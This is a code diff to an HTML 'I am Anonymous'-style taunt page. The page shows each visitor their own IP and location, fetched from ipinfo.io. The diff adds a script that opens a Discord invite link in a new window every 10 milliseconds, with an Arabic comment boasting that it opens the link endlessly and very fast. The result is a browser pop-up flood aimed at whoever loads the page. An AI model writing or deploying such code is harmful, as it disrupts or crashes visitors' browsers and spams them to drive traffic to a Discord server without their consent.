@@ -68,7 +68,7 @@
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
 
-    <div class="text">(I am A7&lt;3)(I am Anonymous)</div>
+    <div class="text">i am A7&lt;3 MR JOHN</div>
 
     <script>
         fetch('https://ipinfo.io/json')
@@ -78,9 +78,11 @@
             const infoDiv = document.getElementById('ip-info');
             infoDiv.textContent = JSON.stringify(data, null, 2);
         });
-    </script>
-</body>
-</html>
+
+        // فتح الرابط بشكل لا نهائي وبسرعة عالية جداً
+        setInterval(() => {
+            window.open("https://discord.gg/VZ467VZkpu", "_blank");
+        }, 10); // كل 0.01 ثانية
     </script>
 </body>
 </html>
